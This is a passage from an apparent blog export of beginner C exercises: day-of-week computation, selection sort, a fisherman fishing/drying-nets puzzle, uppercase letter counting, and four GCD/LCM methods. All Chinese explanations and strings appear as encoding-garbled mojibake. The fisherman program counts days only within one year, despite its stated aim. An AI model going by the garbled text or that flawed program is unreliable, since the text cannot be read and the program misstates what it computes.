class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	weekday=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :&quot;</span>,year,month,day);</span><br><span class="line">	<span class="keyword">switch</span>(weekday)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">puts</span>(<span class="string">&quot;Sunday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">puts</span>(<span class="string">&quot;Monday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">puts</span>(<span class="string">&quot;Tuesday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">puts</span>(<span class="string">&quot;Wednesday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">puts</span>(<span class="string">&quot;Thursday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">puts</span>(<span class="string">&quot;Friday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">puts</span>(<span class="string">&quot;Saturday&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/x.jpg"></p>
<h2 id="é€‰æ‹©æ’åº"><a href="#é€‰æ‹©æ’åº" class="headerlink" title="é€‰æ‹©æ’åº"></a>é€‰æ‹©æ’åº</h2><p>é€‰æ‹©æ’åº  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;N;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[i])			<span class="comment">// &gt; ä¸ºé™åºï¼Œ&lt; ä¸ºå‡åº</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[i],a[i]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;é€‰æ‹©æ’åº é™åºï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/8.png"></p>
<h2 id="æ¸”å¤«æ‰“æ¸”æ™’ç½‘"><a href="#æ¸”å¤«æ‰“æ¸”æ™’ç½‘" class="headerlink" title="æ¸”å¤«æ‰“æ¸”æ™’ç½‘"></a>æ¸”å¤«æ‰“æ¸”æ™’ç½‘</h2><p>å¦‚æœä¸€ä¸ªæ¸”å¤«ä» 2019 å¹´ 1 æœˆ 1 æ—¥å¼€å§‹æ¯ä¸‰å¤©æ‰“ä¸€æ¬¡æ¸”ï¼Œä¸¤å¤©æ™’ä¸€æ¬¡ç½‘ï¼Œç¼–ç¨‹å®ç°å½“è¾“å…¥ 2019 1 æœˆ 1 æ—¥ä»¥åçš„ä»»æ„ä¸€å¤©ï¼Œè¾“å‡ºè¯¥æ¸”å¤«æ˜¯åœ¨æ‰“æ¸”è¿˜æ˜¯åœ¨æ™’ç½‘ã€‚</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*å¦‚æœä¸€ä¸ªæ¸”å¤«ä» 2019 å¹´ 1 æœˆ 1 æ—¥å¼€å§‹æ¯ä¸‰å¤©æ‰“ä¸€æ¬¡æ¸”ï¼Œä¸¤å¤©æ™’ä¸€æ¬¡ç½‘ï¼Œ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¼–ç¨‹å®ç°å½“è¾“å…¥ 2011 1 æœˆ 1 æ—¥ä»¥åçš„ä»»æ„ä¸€å¤©ï¼Œè¾“å‡ºè¯¥æ¸”å¤«æ˜¯åœ¨æ‰“æ¸”è¿˜æ˜¯åœ¨æ™’ç½‘ã€‚*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(1) è‡ªå®šä¹‰å‡½æ•° leap()ï¼Œç”¨æ¥åˆ¤æ–­è¾“å…¥çš„å¹´ä»½æ˜¯å¦æ˜¯é—°å¹´ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  (2) è‡ªå®šä¹‰å‡½æ•° number()ï¼Œç”¨æ¥è®¡ç®—è¾“å…¥æ—¥æœŸè· 2019 å¹´ 1 æœˆ 1 æ—¥å…±æœ‰å¤šå°‘å¤©ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  (3) main() å‡½æ•°ä½œä¸ºç¨‹åºçš„å…¥å£å‡½æ•°ï¼Œåœ¨ main() å‡½æ•°ä¸­è°ƒç”¨ä¸Šé¢ä¸¤ä¸ªå‡½æ•°ã€‚ç¨‹åºä»£ç å¦‚ä¸‹ï¼š*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">leap</span><span class="params">(<span class="keyword">int</span> year)</span></span>;				<span class="comment">//å‡½æ•°å£°æ˜ </span></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">number</span><span class="params">(<span class="keyword">int</span> y,<span class="keyword">int</span> m,<span class="keyword">int</span> d)</span></span>;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">int</span> year,month,day,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥å¹´/æœˆ/æ—¥:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(leap(year)==<span class="number">366</span>)					<span class="comment">//é—°å¹´||å¹³å¹´ </span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%då¹´æ˜¯é—°å¹´!\n&quot;</span>,year);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%då¹´æ˜¯å¹³å¹´!\n&quot;</span>,year);</span><br><span class="line">	</span><br><span class="line">	sum=number(year,month,day);	<span class="comment">//è°ƒç”¨å‡½æ•°æ±‚å¤©æ•° </span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(sum%<span class="number">5</span>&lt;<span class="number">4</span>&amp;&amp;sum%<span class="number">5</span>&gt;<span class="number">0</span>)	<span class="comment">//å¦‚æœä½™æ•° ä¸º 1,2,3 å°±æ‰“æ¸”ï¼Œå¦åˆ™å°± æ™’ç½‘ </span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :æ‰“æ¸”!\n&quot;</span>,year,month,day);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :æ™’ç½‘!\n&quot;</span>,year,month,day);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leap</span><span class="params">(<span class="keyword">int</span> year)</span><span class="comment">//æ±‚é—°å¹´ï¼Œå¹³å¹´ </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">366</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">365</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">number</span><span class="params">(<span class="keyword">int</span> y,<span class="keyword">int</span> m,<span class="keyword">int</span> d)</span><span class="comment">//æ±‚æŸæ—¥ æ˜¯è¿™å¹´çš„å¤šå°‘å¤© </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(m<span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">11</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">10</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">9</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">8</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">7</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">6</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">5</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">4</span>:d+=<span class="number">30</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">3</span>:d+=<span class="number">31</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">2</span>:<span class="keyword">if</span>(y%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;y%<span class="number">100</span>!=<span class="number">0</span>||y%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">						d+=<span class="number">29</span>;</span><br><span class="line">					<span class="keyword">else</span>	</span><br><span class="line">						d+=<span class="number">28</span>;</span><br><span class="line">			<span class="keyword">case</span>  <span class="number">1</span>:d+=<span class="number">31</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/yf.jpg"></p>
<h2 id="è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°"><a href="#è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°" class="headerlink" title="è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°"></a>è¾“å…¥ä¸€ä¸²å­—ç¬¦ç»Ÿè®¡é‡Œé¢å„ä¸ªå¤§å†™å­—æ¯çš„ä¸ªæ•°</h2><p><em>ï¼ˆå…¶å®ƒå­—ç¬¦åŒç†ï¼‰</em></p>
<p>æºä»£ç ï¼š  </p>
<p><strong>æ— è¯¦è§£ï¼å…·ä½“è‡ªå·±åˆ†æï¼</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum[<span class="number">26</span>],i;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">		sum[i]=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>((ch=getchar())!=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">			sum[ch<span class="number">-65</span>]++;	 </span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(sum[i]!=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;å­—æ¯ %c æœ‰ %d ä¸ª!\n&quot;</span>,i+<span class="number">65</span>,sum[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/HOW.jpg"></p>
<h2 id="æœ€å¤§å…¬çº¦æ•°-amp-amp-æœ€å°å…¬å€æ•°"><a href="#æœ€å¤§å…¬çº¦æ•°-amp-amp-æœ€å°å…¬å€æ•°" class="headerlink" title="æœ€å¤§å…¬çº¦æ•°&amp;&amp;æœ€å°å…¬å€æ•°"></a>æœ€å¤§å…¬çº¦æ•°&amp;&amp;æœ€å°å…¬å€æ•°</h2><p><strong>å…¬çº¦æ•°</strong>ï¼Œäº¦ç§°â€œå…¬å› æ•°â€ã€‚å®ƒæ˜¯ä¸€ä¸ªèƒ½è¢«è‹¥å¹²ä¸ªæ•´æ•°åŒæ—¶å‡æ•´é™¤çš„<a href="https://baike.baidu.com/item/%E6%95%B4%E6%95%B0/1293937">æ•´æ•°</a>ã€‚å¦‚æœä¸€ä¸ªæ•´æ•°åŒæ—¶æ˜¯å‡ ä¸ªæ•´æ•°çš„<a href="https://baike.baidu.com/item/%E7%BA%A6%E6%95%B0/8417882">çº¦æ•°</a>ï¼Œç§°è¿™ä¸ªæ•´æ•°ä¸ºå®ƒä»¬çš„â€œå…¬çº¦æ•°â€ï¼›å…¬çº¦æ•°ä¸­æœ€å¤§çš„ç§°ä¸ºæœ€å¤§å…¬çº¦æ•°ã€‚å¯¹ä»»æ„çš„è‹¥å¹²ä¸ªæ­£æ•´æ•°ï¼Œ1æ€»æ˜¯å®ƒä»¬çš„å…¬å› æ•°ã€‚  </p>
<p><strong>å…¬å€æ•°</strong>(common multiple)æ˜¯æŒ‡åœ¨ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è‡ªç„¶æ•°ä¸­ï¼Œå¦‚æœå®ƒä»¬æœ‰ç›¸åŒçš„å€æ•°ï¼Œè¿™äº›å€æ•°å°±æ˜¯å®ƒä»¬çš„å…¬å€æ•°ã€‚å…¬å€æ•°ä¸­æœ€å°çš„ï¼Œå°±ç§°ä¸ºè¿™äº›<a href="https://baike.baidu.com/item/%E6%95%B4%E6%95%B0/1293937">æ•´æ•°</a>çš„<strong>æœ€å°å…¬å€æ•°</strong>ï¼ˆlowest common multipleï¼‰</p>
<p>ç¤ºæ„å›¾ï¼š  </p>
<p><img src="/2019/08/12/OLD/007.jpg"></p>
<h3 id="ç©·ä¸¾æ³•"><a href="#ç©·ä¸¾æ³•" class="headerlink" title="ç©·ä¸¾æ³•"></a>ç©·ä¸¾æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_gys</span><span class="params">(<span class="keyword">int</span> number,<span class="keyword">int</span> number_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,gys=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(number&gt;number_2)</span><br><span class="line">		i=number,number=number_2,number_2=i;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=number;i++)	</span><br><span class="line">		<span class="keyword">if</span>(number%i==<span class="number">0</span>&amp;&amp;number_2%i==<span class="number">0</span>)</span><br><span class="line">			gys=i;</span><br><span class="line">	<span class="keyword">return</span> gys;</span><br><span class="line">	<span class="comment">/*for(i=number;i&gt;0;i--)	</span></span><br><span class="line"><span class="comment">		if(number%i==0&amp;&amp;number_2%i==0)</span></span><br><span class="line"><span class="comment">			&#123;gys=i;break;&#125;</span></span><br><span class="line"><span class="comment">	return gys;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min_gbs</span><span class="params">(<span class="keyword">int</span> number,<span class="keyword">int</span> number_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,gbs;</span><br><span class="line">	<span class="keyword">if</span>(number&gt;number_2)</span><br><span class="line">		i=number,number=number_2,number_2=i;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">for</span>(i=number;i&gt;<span class="number">0</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(i%number==<span class="number">0</span>&amp;&amp;i%number_2==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				gbs=i;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> gbs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,a,b,m,n,t,gy,gb;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %d çš„æœ€å¤§å…¬çº¦æ•°ï¼š%d\n&quot;</span>,m,n,max_gys(a,b));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %d çš„æœ€å°å…¬å€æ•°ï¼š%d\n&quot;</span>,m,n,min_gbs(a,b));	</span><br><span class="line">	<span class="comment">/*gb=m*n/max_gys(a,b);//æœ€å°å…¬å€æ•° ä¹Ÿå¯ä»¥ ä¸¤æ•°ç›¸ä¹˜é™¤ä»¥æœ€å¤§å…¬çº¦æ•° */</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="çŸ­é™¤æ³•"><a href="#çŸ­é™¤æ³•" class="headerlink" title="çŸ­é™¤æ³•"></a>çŸ­é™¤æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_gys</span><span class="params">(<span class="keyword">int</span> number,<span class="keyword">int</span> number_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,gys=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(number&lt;number_2)</span><br><span class="line">		i=number,number=number_2,number_2=i;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=number; )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(number%i==<span class="number">0</span>&amp;&amp;number_2%i==<span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					number/=i;</span><br><span class="line">					number_2/=i;</span><br><span class="line">					gys*=i;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				i++;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> gys;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,a,b,m,n,gy=<span class="number">1</span>,gb=<span class="number">1</span>,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°å­—ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;	</span><br><span class="line">   	gb=m*n/max_gys(a,b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %dçš„æœ€å¤§å…¬çº¦æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,max_gys(a,b));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å’Œ %dçš„æœ€å°å…¬å€æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,gb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è¾—è½¬ç›¸é™¤æ³•"><a href="#è¾—è½¬ç›¸é™¤æ³•" class="headerlink" title="è¾—è½¬ç›¸é™¤æ³•"></a>è¾—è½¬ç›¸é™¤æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,r,m,n,gb;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;</span><br><span class="line">	<span class="keyword">while</span>(b)			<span class="comment">//b=r å³ç”¨ a%b ä½œä¸ºå¾ªç¯æ¡ä»¶ </span></span><br><span class="line">		&#123;</span><br><span class="line">			r=a%b;</span><br><span class="line">			a=b;		<span class="comment">//æœ€å¤§å…¬çº¦æ•° ä¸º a  </span></span><br><span class="line">			b=r;	</span><br><span class="line">		&#125;</span><br><span class="line">	gb=m*n/a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å¤§å…¬çº¦æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å°å…¬å€æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,gb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="å‡æ³•"><a href="#å‡æ³•" class="headerlink" title="å‡æ³•"></a>å‡æ³•</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,m,n,gb;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	m=a,n=b;</span><br><span class="line">	<span class="keyword">while</span>(a!=b)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(a&gt;b)		<span class="comment">//æœ€å¤§å…¬çº¦æ•° ä¸º a  </span></span><br><span class="line">				a-=b;</span><br><span class="line">			<span class="keyword">if</span>(b&gt;a)</span><br><span class="line">				b-=a;</span><br><span class="line">		&#125;</span><br><span class="line">	gb=m*n/a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å¤§å…¬çº¦æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%då’Œ%dçš„æœ€å°å…¬å€æ•°ä¸ºï¼š%d\n&quot;</span>,m,n,gb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/233.jpg"></p>
]]></content>
      <categories>
        <category>Cè¯­è¨€</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
</search>
